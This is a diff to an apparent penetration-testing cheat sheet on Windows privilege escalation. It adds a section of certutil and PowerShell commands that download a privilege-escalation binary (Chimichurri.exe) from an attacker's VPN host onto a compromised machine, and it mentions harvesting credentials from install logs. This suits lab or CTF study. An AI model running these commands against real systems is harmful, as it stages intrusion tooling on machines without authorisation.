@@ -70,6 +70,7 @@
     - [Windows PrivEsc Resources](#windows-privesc-resources)
     - [Windows PrivEsc Tools/Scripts](#windows-privesc-toolsscripts)
       - [Attacks](#attacks-1)
+      - [Useful Commands to get Files onto Windows Systems](#useful-commands-to-get-files-onto-windows-systems)
       - [Enumeration scripts](#enumeration-scripts)
       - [Windows Shell Enumeration Commands](#windows-shell-enumeration-commands)
       - [Search for CVE](#search-for-cve)
@@ -1363,6 +1364,13 @@ privilege-escalation-awesome-scripts-suite)
 - Check panther directory, install logs get put in here and contain creds
 - Read contents of file in PS shell
 - `get-Content "filename"`
+
+
+#### Useful Commands to get Files onto Windows Systems
+- `certutil -url -f "http://<Your VPN IP>/<File your trying to get on the system>" "<name of file to be downloaded>"`
+  - Example: `certutil -url -f http://10.10.1.1/Chimichurri.exe chim.exe`
+- `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<VPN IP>:<PORT>/<File You want>', '<name of file to be downloaded & Path>"`
+  - Example: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.50:2222/Chimichurri.exe', 'C:\Users\Public\Downloads\Chimichurri.exe')"`
 
 #### Enumeration scripts
 - General scans
